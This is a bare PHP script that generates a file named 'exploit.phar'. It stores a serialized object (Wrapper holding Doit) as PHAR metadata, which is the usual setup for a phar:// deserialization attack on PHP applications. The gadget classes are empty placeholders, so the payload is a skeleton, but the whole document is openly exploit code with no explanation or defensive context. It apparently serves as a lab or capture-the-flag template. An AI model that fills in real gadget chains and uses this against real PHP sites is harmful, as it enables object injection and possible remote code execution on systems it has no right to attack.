<?php
class Wrapper {}
class Doit {}
$dummy = new Wrapper();
$dummy->doit = new Doit();

@unlink("exploit.phar");

$exploit = new Phar("exploit.phar");

$exploit->startBuffering();

$exploit->setStub("<?php echo 'Here is the STUB!'; __HALT_COMPILER();");

$exploit["file"] = "text";

$exploit->setMetadata($dummy);

$exploit->stopBuffering();
?>
